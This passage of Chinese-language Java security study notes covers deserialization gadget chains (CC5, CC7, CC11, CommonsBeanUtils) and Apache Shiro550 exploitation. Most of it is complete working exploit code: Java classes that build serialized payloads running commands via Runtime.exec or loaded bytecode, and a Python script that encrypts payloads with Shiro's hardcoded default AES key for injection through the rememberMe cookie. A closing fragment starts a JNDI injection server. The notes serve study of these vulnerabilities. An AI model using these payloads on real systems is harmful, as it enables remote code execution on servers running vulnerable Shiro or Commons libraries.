​	![Snipaste_2025-04-01_10-31-45](JAVA安全/Snipaste_2025-04-01_10-31-45.png)

- 跟进`getValue()`，其中调用了`get()`，其中`map`是下一个链的节点

​	![Snipaste_2025-04-01_10-33-02](JAVA安全/Snipaste_2025-04-01_10-33-02.png)

- 可以先写一部分代码证实链的可行性

  ```java
  Transformer[] transformers = new Transformer[] {
      new ConstantTransformer(Runtime.class),
      new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
      new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
      new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
          };
  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  
  HashMap<Object, Object> map = new HashMap<>();
  Map lazymap = LazyMap.decorate(map, chainedTransformer);
  
  Class<? extends Map> lazymapClass = lazymap.getClass();
  Method getMethod = lazymapClass.getDeclaredMethod("get", Object.class);
  getMethod.invoke(lazymap, chainedTransformer);
  TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
  tiedMapEntry.toString();
  ```

- 然后是找到`toString()`的调用方法，最好在入口方法中，，作者选择的是`BadAttributeValueExpException.readObject()`

  ![Snipaste_2025-04-01_10-37-14](JAVA安全/Snipaste_2025-04-01_10-37-14.png)

  - 看一下代码逻辑，valObject是通过val变量控制，通过反射修改此变量为下一个节点即可

    ```java
    //创建对象用于后面反射传入变量值
    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
    Class<? extends BadAttributeValueExpException> badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();
    Field valField = badAttributeValueExpExceptionClass.getDeclaredField("val");
    valField.setAccessible(true);
    valField.set(badAttributeValueExpException, tiedMapEntry);
    ```

- 完整代码如下

  ```java
  package CC5;
  
  import org.apache.commons.collections.Transformer;
  import org.apache.commons.collections.functors.ChainedTransformer;
  import org.apache.commons.collections.functors.ConstantTransformer;
  import org.apache.commons.collections.functors.InvokerTransformer;
  import org.apache.commons.collections.keyvalue.TiedMapEntry;
  import org.apache.commons.collections.map.LazyMap;
  
  import javax.management.BadAttributeValueExpException;
  import java.io.*;
  import java.lang.reflect.Field;
  import java.util.HashMap;
  import java.util.Map;
  
  public class CC5 {
      public static void main(String[] args) throws Exception{
  
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                  new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
          };
          ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  
          HashMap<Object, Object> map = new HashMap<>();
          Map lazymap = LazyMap.decorate(map, chainedTransformer);
  
          TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap, "key");
  
          BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
          Class<? extends BadAttributeValueExpException> badAttributeValueExpExceptionClass = badAttributeValueExpException.getClass();
          Field valField = badAttributeValueExpExceptionClass.getDeclaredField("val");
          valField.setAccessible(true);
          valField.set(badAttributeValueExpException, tiedMapEntry);
  
          serialize(badAttributeValueExpException);
          deserialize("ser5.bin");
  
      }
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser5.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  
  ```

- Gadget

  ```java
  BadAttributeValueExpException.readObject()
  	TiedMapEntry.toString()
  	TiedMapEntry.getValue()
  		LazyMap.get()
  			ChainedTransformer.transform()
                      ConstantTransformer(Runtime.class)
                      InvokerTransformer.transform()
                          Class.getMethod
                          gerMethod.getRuntime()
                          Runtime.getRuntime().exec()
  ```

### CC7

CC7与CC5相同更改了入口类，但利用链没变，还是从`Lazy.get()`入手

- 通过`AbstractMap.equals()`调用`get()`，其中的m便是可控的类

  ![Snipaste_2025-04-01_11-23-57](JAVA安全/Snipaste_2025-04-01_11-23-57.png)

- 然后入口是`Hashtable.readObject()`，跟进`reconstitutionPut()`

  ![Snipaste_2025-04-01_11-26-40](JAVA安全/Snipaste_2025-04-01_11-26-40.png)

  - 该方法中调用了`equals()`

    ![Snipaste_2025-04-01_11-27-39](JAVA安全/Snipaste_2025-04-01_11-27-39.png)

  - 之后跟链的时候发现先调用的是`AbstractMapDecorator.equals`，再到`AbstractMap.equals()`中，因为`AbstractMapDecorator`继承了map接口，但还要找到实现类也就是`AbstractMap`

- 逻辑基本理顺，编写初步EXP，因为`AbstractMap`类不能序列化所以直接从入口类入手

  ```java
  Transformer[] transformers = new Transformer[] {
      new ConstantTransformer(Runtime.class),
      new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
      new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
      new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
  };
  ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
  HashMap<Object, Object> map = new HashMap<>();
  Map lazymap = LazyMap.decorate(map, chainedTransformer);
  
  Hashtable<Object, Object> hashtable = new Hashtable<>();
  hashtable.put(lazymap, "value");
  
  serialize(hashtable);
  deserialize("ser7.bin");
  ```

  - 运行代码没有报错，但也没执行命令，在`readObject()`处打断点调试，发现没有进入for循环，因为tab[index]中的值为空，也就没有调用`equals()`

    ![Snipaste_2025-04-01_11-18-57](JAVA安全/Snipaste_2025-04-01_11-18-57.png)

- 这里yso中的写法如下

  ![Snipaste_2025-04-01_12-24-51](JAVA安全/Snipaste_2025-04-01_12-24-51.png)

  - 这里之所以要调用两次`Hashtable.put()`，是因为要在`readObject()`的for循环中调用两次`reconstitutionPut()`

    ![Snipaste_2025-04-01_13-36-45](JAVA安全/Snipaste_2025-04-01_13-36-45.png)

  - 第一次调用该方法时没有调用`e.key.equals(key)`，因为tab[index]值为空，然后在下面被赋值

    ![Snipaste_2025-04-01_12-28-25](JAVA安全/Snipaste_2025-04-01_12-28-25.png)

  - 然后第二次调用`reconstitutionPut()`时，成功进入for循环然后进行if判断，但是要调用想要的`equals()`，首先`&&`前的`e.hash == hash`要判断为真，此时e的值为`yy`，而Java中有一个hash碰撞bug：

    ```java
    "yy".hashCode() == "zZ".hashCode()
    ```

    ![Snipaste_2025-04-01_13-45-02](JAVA安全/Snipaste_2025-04-01_13-45-02.png)

  - 所以如此赋值可以成功进入后面调用`AbstractMapDecorator.equal()`

    ![Snipaste_2025-04-01_13-54-15](JAVA安全/Snipaste_2025-04-01_13-54-15.png)

  - 之所以后面又要删掉lazymap2里面的yy，是因为`HashTable.put()`中也会调用`equals()`，且还会增加一个yy键，所以在序列化时可以执行整体链但是在反序列化时则不行

    ![Snipaste_2025-04-01_14-09-12](JAVA安全/Snipaste_2025-04-01_14-09-12.png)

- 为了避免在序列化时通过`HashTable.put()`调用`equals()`，还是像之前一样先不将整条链写完整，然后在序列化前再将链补全，所以最终的EXP如下

  ```java
  package CC7;
  
  import org.apache.commons.collections.Transformer;
  import org.apache.commons.collections.functors.ChainedTransformer;
  import org.apache.commons.collections.functors.ConstantTransformer;
  import org.apache.commons.collections.functors.InvokerTransformer;
  import org.apache.commons.collections.map.AbstractMapDecorator;
  import org.apache.commons.collections.map.LazyMap;
  
  import java.io.*;
  import java.lang.reflect.Field;
  import java.util.AbstractMap;
  import java.util.HashMap;
  import java.util.Hashtable;
  import java.util.Map;
  
  public class CC7 {
      public static void main(String[] args) throws Exception {
  
          Transformer[] transformers = new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                  new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
          };
          ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
  
          HashMap<Object, Object> hashmap1 = new HashMap<>();
          HashMap<Object, Object> hashmap2 = new HashMap<>();
  
          Map lazymap1 = LazyMap.decorate(hashmap1, chainedTransformer);
          hashmap1.put("yy", 1);
          Map lazymap2 = LazyMap.decorate(hashmap2, chainedTransformer);
          hashmap2.put("zZ", 1);
  
          Hashtable<Object, Object> hashtable = new Hashtable<>();
          hashtable.put(lazymap1, 1);
          hashtable.put(lazymap2, 2);
          hashmap2.remove("yy");
  
          Class<? extends ChainedTransformer> chainedTransformerClass = chainedTransformer.getClass();
          Field iTransformersField = chainedTransformerClass.getDeclaredField("iTransformers");
          iTransformersField.setAccessible(true);
          iTransformersField.set(chainedTransformer, transformers);
  
          serialize(hashtable);
          deserialize("ser7.bin");
  
      }
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser7.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws Exception {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  
  ```

- Gadget

  ```java
  Hashtable.readObject()
  Hashtable.reconstitutionPut()
  	AbstractMapDecorator.equals()
  		AbstractMap.equals()
              LazyMap.get()
                  ChainedTransformer.transform()
                          ConstantTransformer(Runtime.class)
                          InvokerTransformer.transform()
                              Class.getMethod
                              gerMethod.getRuntime()
                              Runtime.getRuntime().exec()
  ```


### CC11

主要是针对Shiro550的命令执行反序列化漏洞，实际上就是**CC2+CC6**的结合，然后受影响的版本是 Commons-Collections 3.1-3.2.1 这些使用更多的版本

#### 链条成因

- 之所以要使用CC2作为后部分链，是因为其没有通过数组调用，若使用数组调用则会保错

  ![Snipaste_2025-04-02_12-28-53](JAVA安全/Snipaste_2025-04-02_12-28-53.png)

  - Shiro不能加载数组是因为其重写了反序列化方法中的`resolveClass()`，以下是原生反序列化中的方法，使用`Class.forName()`获取Class

    ![Snipaste_2025-04-02_12-58-33](JAVA安全/Snipaste_2025-04-02_12-58-33.png)

  - 而Shiro中自写了`ClassUtils`类

    ![Snipaste_2025-04-02_12-58-19](JAVA安全/Snipaste_2025-04-02_12-58-19.png)

  - 其中使用`loadClass`加载

    ![Snipaste_2025-04-02_12-59-02](JAVA安全/Snipaste_2025-04-02_12-59-02.png)

- 大体来说就是`loadClass()`没法加载数组类，而`Class.forName()`可以，更深入就涉及Tomcat的类加载机制了，先不做多余了解

#### 链条构造

- 这里先拿出CC2的后部分

  ```java
  TemplatesImpl templates = new TemplatesImpl();
  Class templatesClass = templates.getClass();
  
  Field name = templatesClass.getDeclaredField("_name");
  name.setAccessible(true);
  name.set(templates, "name");
  
  Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
  bytecodes.setAccessible(true);
  byte[] code = Files.*readAllBytes*(Paths.*get*("D:\\Loader\\Calc.class"));
  byte[][] codes = {code};
  bytecodes.set(templates, codes);
  
  InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
  ```

  - 这里没使用`TransformingComparator`是因为该类是在CommonsCollections 4新加的

- 然后是CC6的前部分

  ```java
  HashMap<Object, Object> map = new HashMap<>();
  Map lazymap = LazyMap.decorate(map, chainedTransformer);
  TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "key");
  
  HashMap<Object, Object> hashMap = new HashMap<>();
  hashMap.put(tiedMapEntry, "value");
  Class<?> clazz = TiedMapEntry.class;
  Field field = clazz.getDeclaredField("map");
  field.setAccessible(true);
  field.set(tiedMapEntry, lazymap);
  
  serialize(hashMap);
  deserialize("ser6.bin");
  ```

- 对这两段代码做一下简单的修改连接即可形成完整代码

  ```java
  package CC11;
  
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  import org.apache.commons.collections.keyvalue.TiedMapEntry;
  import org.apache.commons.collections.map.LazyMap;
  import org.apache.commons.collections.functors.InvokerTransformer;
  
  import java.io.*;
  import java.lang.reflect.Field;
  import java.nio.file.Files;
  import java.nio.file.Paths;
  import java.util.HashMap;
  import java.util.Map;
  
  public class CC11 {
      public static void main(String[] args) throws Exception {
  
          TemplatesImpl templates = new TemplatesImpl();
          Class templatesClass = templates.getClass();
  
          Field name = templatesClass.getDeclaredField("_name");
          name.setAccessible(true);
          name.set(templates, "name");
  
          Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
          bytecodes.setAccessible(true);
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
          byte[][] codes = {code};
          bytecodes.set(templates, codes);
  
  
          InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
  
          HashMap<Object, Object> map = new HashMap<>();
          Map lazymap = LazyMap.decorate(map, invokerTransformer);
  		//这里构成LazyMap.get(templates)
          TiedMapEntry tiedMapEntry = new TiedMapEntry(map, templates);
  
          HashMap<Object, Object> hashMap = new HashMap<>();
          hashMap.put(tiedMapEntry, "value");
  
          Class<?> clazz = TiedMapEntry.class;
          Field field = clazz.getDeclaredField("map");
          field.setAccessible(true);
          field.set(tiedMapEntry, lazymap);
  
          serialize(hashMap);
          deserialize("ser11.bin");
      }
  
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser11.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  ```

- 鉴于反复使用反射修改私有成员变量，所以将这个过程独立的单独的模块`setFieldValue()`

  ```java
  package CC11;
  
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  import org.apache.commons.collections.keyvalue.TiedMapEntry;
  import org.apache.commons.collections.map.LazyMap;
  import org.apache.commons.collections.functors.InvokerTransformer;
  
  import java.io.*;
  import java.lang.reflect.Field;
  import java.nio.file.Files;
  import java.nio.file.Paths;
  import java.util.HashMap;
  import java.util.Map;
  
  public class CC11 {
      public static void main(String[] args) throws Exception {
  
          TemplatesImpl templates = new TemplatesImpl();
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
  
          setFieldValue(templates, "_name", "Jw1ng");
          setFieldValue(templates, "_bytecodes", new byte[][]{code});
  
          InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);
  
          HashMap<Object, Object> map = new HashMap<>();
          Map lazymap = LazyMap.decorate(map, invokerTransformer);
          TiedMapEntry tiedMapEntry = new TiedMapEntry(map, templates);
  
          HashMap<Object, Object> hashMap = new HashMap<>();
          hashMap.put(tiedMapEntry, "value");
  
          setFieldValue(tiedMapEntry, "map", lazymap);
  
          serialize(hashMap);
          deserialize("ser11.bin");
      }
  
      public static void setFieldValue(Object obj, String fieldname, Object value) throws NoSuchFieldException, IllegalAccessException {
          Field field = obj.getClass().getDeclaredField(fieldname);
          field.setAccessible(true);
          field.set(obj, value);
      }
  
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser11.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  
  ```

- Gadget

  ```java
  HashMap.readObject()
  	TiedMapEntry.hashCode()
  	TiedMapEntry.getValue()
  		LazyMap.get()
  			InvokerTransformer.transform()
      			TemplatesImpl.newTransformer()
  ```

### CB

#### CommonsBeanUtils 

- Apache中还有Beanutils工作集，用于操控JavaBean，用`PropertyUtils.getProperty()`可以调用成员变量的getter方法

  ![Snipaste_2025-04-02_17-27-07](JAVA安全/Snipaste_2025-04-02_17-27-07.png)

- 打断点调试会发现在`PropertyUtilsBean`类中将传入的成员变量转为符合Bean的格式`name->Name`，最后`invokeMethod()`调用`getName()`并将获取的值返回

![Snipaste_2025-04-02_17-24-36](JAVA安全/Snipaste_2025-04-02_17-24-36.png)

#### 链子分析

这里选用命令执行方法是类加载，也就是调用`TemplatesImpl.newTransformer()`

- 这里使用上面分析的CB依赖调用，也就是要在`TemplatesImpl`类中找到调用了`newTransformer()`的某getter方法，这里找到`getOutputProperties()`

  ![Snipaste_2025-04-02_19-39-57](JAVA安全/Snipaste_2025-04-02_19-39-57.png)

  - 编写简单EXP验证链的可行性

    ```java
    TemplatesImpl templates = new TemplatesImpl();
    Class templatesClass = templates.getClass();
    
    Field name = templatesClass.getDeclaredField("_name");
    name.setAccessible(true);
    name.set(templates, "name");
    
    Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
    bytecodes.setAccessible(true);
    byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
    byte[][] codes = {code};
    bytecodes.set(templates, codes);
    
    Field tfactory = templatesClass.getDeclaredField("_tfactory");
    tfactory.setAccessible(true);
    tfactory.set(templates, new TransformerFactoryImpl());
    
    //传入符合Bean格式要求的property 
    //outputProperties->getOutputProperties
    PropertyUtils.getProperty(templates, "outputProperties");
    ```

- 接着在CB类中找调用了`getProperty`的类，最后找到了`BeanComparator.compare()`

  ![Snipaste_2025-04-02_18-09-25](JAVA安全/Snipaste_2025-04-02_18-09-25.png)

- 又想到CC2中在入口类`PriorityQueue`中调用了`compare()`，正好能将这个链接起来

  ![Snipaste_2025-04-02_20-02-39](JAVA安全/Snipaste_2025-04-02_20-02-39.png)

  ```java
  TemplatesImpl templates = new TemplatesImpl();
  Class templatesClass = templates.getClass();
  
  Field name = templatesClass.getDeclaredField("_name");
  name.setAccessible(true);
  name.set(templates, "name");
  
  Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
  bytecodes.setAccessible(true);
  byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
  byte[][] codes = {code};
  bytecodes.set(templates, codes);
  
  Field tfactory = templatesClass.getDeclaredField("_tfactory");
  tfactory.setAccessible(true);
  tfactory.set(templates, new TransformerFactoryImpl());
  
  BeanComparator beanComparator = new BeanComparator("outputProperties");
  
  //将comparator传为beanComparator，进入BeanComparator.comapre()
  PriorityQueue priorityQueue = new PriorityQueue<>(beanComparator);
  //在队列中添加两个值，为了进入for循环
  priorityQueue.add(templates);
  priorityQueue.add(2);
  ```

- 然后再加上入口类和反序列化，并将代码整体优化一下

  ```java
  package CB;
  
  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
  import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
  import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
  import org.apache.commons.beanutils.BeanComparator;
  import org.apache.commons.beanutils.PropertyUtils;
  import org.apache.commons.collections4.comparators.TransformingComparator;
  import org.apache.commons.collections4.functors.ConstantTransformer;
  
  import java.io.*;
  import java.lang.reflect.Field;
  import java.nio.file.Files;
  import java.nio.file.Paths;
  import java.util.PriorityQueue;
  
  public class CB {
      public static void main(String[] args) throws Exception {
          TemplatesImpl templates = new TemplatesImpl();
          byte[] code = Files.readAllBytes(Paths.get("D:\\Loader\\Calc.class"));
  
          setFieldValue(templates, "_name", "Jw1ng");
          setFieldValue(templates, "_bytecodes", new byte[][]{code});
  
          BeanComparator beanComparator = new BeanComparator("outputProperties");
  
          PriorityQueue priorityQueue = new PriorityQueue<>(beanComparator);
          setFieldValue(priorityQueue, "queue", new Object[]{templates, 2});
  //这里之所以在queue中添加了值后还要修改size是因为queue和size是两个独立的字段，它们的更新不关联，也就是虽然通过反射添加了两个队列但size的值还是0，也就不会进入for循环
          setFieldValue(priorityQueue, "size", 2);
  
          serialize(priorityQueue);
          deserialize("cb.bin");
      }
  
      public static void setFieldValue(Object obj, String filename, Object value) throws NoSuchFieldException, IllegalAccessException {
          Field field = obj.getClass().getDeclaredField(filename);
          field.setAccessible(true);
          field.set(obj, value);
      }
  
      public static void serialize(Object obj) throws IOException {
          ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cb.bin"));
          oos.writeObject(obj);
      }
  
      public static Object deserialize(String Filename) throws IOException, ClassNotFoundException {
          ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
          Object o = ois.readObject();
          return o;
      }
  }
  
  ```

#### 两个问题

以上的EXP在本地能正确执行了，但是用于shiro漏洞时又有问题

- 首先是第一个问题`org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID = -2044202215314119608, local class serialVersionUID = -3490850999041592962`

  - 这个问题的原因很简单，就是本地类生成序列化UID与目标类不符，也就是版本问题，我用的CB版本是1.9.2，而shiro环境用的是1.8.3，让版本相同即可

- 第二个问题是`Unable to load ObjectStreamClass [org.apache.commons.collections.comparators.ComparableComparator: static final long serialVersionUID = -291439688585137865L;]: `

  - 这里没有使用CC集，为什么又去加载呢，问题出在`BeanComparator`中

    ![Snipaste_2025-04-02_20-08-19](JAVA安全/Snipaste_2025-04-02_20-08-19.png)

  - 这个类的构造方法中如果没有传入comparator就会通过`ComparableComparator`实例化，而`ComparableComparator`就是CC下的类，所以要传入一个jdk自带的`comparator`，要求是能序列化最后找到`AttrCompare`

    ![Snipaste_2025-04-02_20-12-06](JAVA安全/Snipaste_2025-04-02_20-12-06.png)

  - EXP只需修改BeanComparator即可

    ```java
    BeanComparator beanComparator = new BeanComparator("outputProperties", new AttrCompare());
    ```

- Gadget

  ```java
  PriorityQueue.readObject()
      heapify()->siftDown->siftDownUsingComparator()
      	BeanComparator.compare()
      		PropertyUtils.getProperty()
      			TemplatesImpl.getOutputProperties()
      				TemplatesImpl.newTransformer()
      					TemplatesImpl.getTransletInstance()
      						TemplatesImpl.newInstance()
  ```

  

### Shiro反序列化

Shiro550反序列化的漏洞在于AES加密时使用了默认密钥，所以可以构造payload造成反序列化漏洞

#### 解密过程

- 在登录界面登录若登录不成功返回包中set-Cookie会有rememberMe=deleteMe;字段

  ![Snipaste_2025-04-01_20-26-37](JAVA安全/Snipaste_2025-04-01_20-26-37.png)

- 若勾选rememberMe，然后登录成功的话返回包中set-Cookie也会有rememberMe=deleteMe;字段，并返回rememberMe的加密字段，且之后登录时也会带上该字段

  ![Snipaste_2025-04-01_20-16-40](JAVA安全/Snipaste_2025-04-01_20-16-40.png)

- Shiro的漏洞就在rememberMe加密字段中，在代码寻找Cookie加密逻辑，最后找到类`CookieRememberMeManager`，获得Cookie字段的方法应该是`getRememberedSerializedIdentity()`

  ![Snipaste_2025-04-01_20-30-54](JAVA安全/Snipaste_2025-04-01_20-30-54.png)

  - 看一下代码逻辑，首先判断是否是Http请求，然后获取请求包和响应包，然后获取其中的Cookie，然后是否有*DELETED_COOKIE_VALUE*也就是`deleteMe`字段，随后判断base64编码长度是否符合，并将base64解码返回

- 然后寻找调用`getRememberedSerializedIdentity()`的方法，找到`getRememberedPrincipals()`

  ![Snipaste_2025-04-01_20-35-09](JAVA安全/Snipaste_2025-04-01_20-35-09.png)

  - 再跟进`convertBytesToPrincipals()`，代码逻辑是先进行解密，再反序列化

    ![Snipaste_2025-04-01_20-36-19](JAVA安全/Snipaste_2025-04-01_20-36-19.png)

#### 分析decrypt()

- 跟进decrypt()

  ![Snipaste_2025-04-01_20-43-44](JAVA安全/Snipaste_2025-04-01_20-43-44.png)

  - 加密序列化数据，再跟进更里层的`decrypt()`，发现是某加密算法通过密钥加密

    ![Snipaste_2025-04-01_20-44-15](JAVA安全/Snipaste_2025-04-01_20-44-15.png)

  - 想看能否通过密钥判断出加密算法，所以选择跟进`getEncryptionCipherKey()`

    ![Snipaste_2025-04-01_20-48-16](JAVA安全/Snipaste_2025-04-01_20-48-16.png)

    ![Snipaste_2025-04-01_20-50-26](JAVA安全/Snipaste_2025-04-01_20-50-26.png)

  - 发现其下有`setCipherKey()`，其中设置的就是默认密钥

    ![Snipaste_2025-04-01_20-46-47](JAVA安全/Snipaste_2025-04-01_20-46-47.png)

  - 找到默认密钥，并得知加密算法是AES对称加密

#### 分析deserialize()

- 跟进deserialize()，找到一个deserialize接口

![Snipaste_2025-04-01_20-52-41](JAVA安全/Snipaste_2025-04-01_20-52-41.png)

![Snipaste_2025-04-01_20-55-26](JAVA安全/Snipaste_2025-04-01_20-55-26.png)

- 发现调用的Shiro自定义的readObject()方法

​	![Snipaste_2025-04-01_20-53-39](JAVA安全/Snipaste_2025-04-01_20-53-39.png)

#### 漏洞原理

知道了在解密时进行了反序列化，那就可以构造加密的反序列化链进行漏洞利用，下面通过断点调试分析一下加密过程

- 首先将断点下在`AbstractRememberMeManager.onSuccessfulLogin()`

  ![Snipaste_2025-04-02_11-02-46](JAVA安全/Snipaste_2025-04-02_11-02-46.png)

  - 前面的`forgetIdentity()`是每次登录成功都去除之前的凭证，然后此处的`isRememberMe()`是判断是否勾选了rememberMe

- 然后下面的`rememberIdentity()`才是记住新凭证，也就是具体的加密过程

  ![Snipaste_2025-04-02_11-17-37](JAVA安全/Snipaste_2025-04-02_11-17-37.png)

- 这里的`getIdentityToRemember()`保存了用户名，跟进下面的`rememberIdentity()`

  ![Snipaste_2025-04-02_10-56-50](JAVA安全/Snipaste_2025-04-02_10-56-50.png)

  - 这里的`convertPrincipalsToBytes()`对凭证进行了序列化和encrypt加密

    ![Snipaste_2025-04-02_10-55-13](JAVA安全/Snipaste_2025-04-02_10-55-13.png)

  - `serialize()`就是序列化

    ![Snipaste_2025-04-02_10-54-28](JAVA安全/Snipaste_2025-04-02_10-54-28.png)

  - `encrypt()`使用了与decrypt()相同的密钥再次证明是对称加密，也就是AES加密

    ![Snipaste_2025-04-02_10-55-39](JAVA安全/Snipaste_2025-04-02_10-55-39.png)

- 然后`rememberIdentity()`下面的`rememberSerializedIdentity()`又进行了base64加密

  ![Snipaste_2025-04-02_11-08-02](JAVA安全/Snipaste_2025-04-02_11-08-02.png)

  - 最后获得Cookie

    ![Snipaste_2025-04-02_11-10-18](JAVA安全/Snipaste_2025-04-02_11-10-18.png)

- 总结一下加密过程也就是序列化->AES->base64，其中AES又默认密钥，base64是公开的加密算法，所以只要在序列化时使用漏洞EXP在按加密过程加密通过Cookie发包，就可能触发反序列化漏洞

#### 漏洞利用

通过前面的分析得知Shiro550反序列化的利用就是对序列化payload先进行AES加密，再进行base64加密，加密脚本如下

```python
import base64
import uuid
import argparse
from Crypto.Cipher import AES


def get_file_name(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    return data

def aes_enc(data):
    key = 'kPH+bIxk5D2deZiIxcaaaA=='
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))
    return base64_ciphertext


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AES encrypt files')
    parser.add_argument('filename', help='File to encrypt')
    args = parser.parse_args()

    data = get_file_name(args.filename)
    print(aes_enc(data))
```

##### URLDNS利用

- URLDNS序列化脚本已经有了，先序列化再加密

​	![Snipaste_2025-04-02_10-37-05](JAVA安全/Snipaste_2025-04-02_10-37-05.png)

- 再修改Cookie内容

  ![Snipaste_2025-04-02_10-34-06](JAVA安全/Snipaste_2025-04-02_10-34-06.png)

  - 这里要先删掉JESSIONID，因为其也可作为登录凭证，就不会对rememberMe进行解密也就不会触发反序列化漏洞

    ![Snipaste_2025-04-02_10-34-31](JAVA安全/Snipaste_2025-04-02_10-34-31.png)

- 成功查询到DNS请求

  ![Snipaste_2025-04-02_10-43-50](JAVA安全/Snipaste_2025-04-02_10-43-50.png)

##### CC11利用

- CC11反序列化payload已给出，获取字节码文件并加密

![Snipaste_2025-04-02_14-00-00](JAVA安全/Snipaste_2025-04-02_14-00-00.png)

- 随后修改rememberMe，成功执行命令

![Snipaste_2025-04-02_14-02-33](JAVA安全/Snipaste_2025-04-02_14-02-33.png)

##### CB链

CB的EXP已给出。只需注意两个问题

1. CB版本是否相符，yso中针对的是1.9.2
2. comparator的加载问题，最好直接传入jdk自带的公有的能序列化的comparator，这样就不用管CC的版本了

### RMI攻击方式

根据基础中分析的RMI运行流程可知有以下几种攻击方式

- Client打Registry
- Client打Server
- Client

但在8u121版本后很多攻击方式以及被过滤了

- 在`RegistryImpl`中加了一个`registryFileter`函数，限制了可以反序列化的类

  ![Snipaste_2025-04-05_10-54-17](JAVA安全/Snipaste_2025-04-05_10-54-17.png)

- 同样在`DGCImpl`中也加入了`checkInput`函数，限制了更少的类可以反序列化

  ![Snipaste_2025-04-05_10-57-15](JAVA安全/Snipaste_2025-04-05_10-57-15.png)

总的来讲RMI的利用范围并不广，且利用的主要就是CC链再做一些变形，不做深入的代码分析，深入的攻击利用可以参考文章：

https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/#1-%E6%94%BB%E5%87%BB-RMI-Registry

### JNDI注入

- 影响rmi协议或ldap协议的使用
  - JDK版本不同
  - 中间件的不同
  - 网络限制
  - 防护设备

- 以下为JNDI中调用RMI服务的实例

`JNDIRMIServer.java`

```java
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
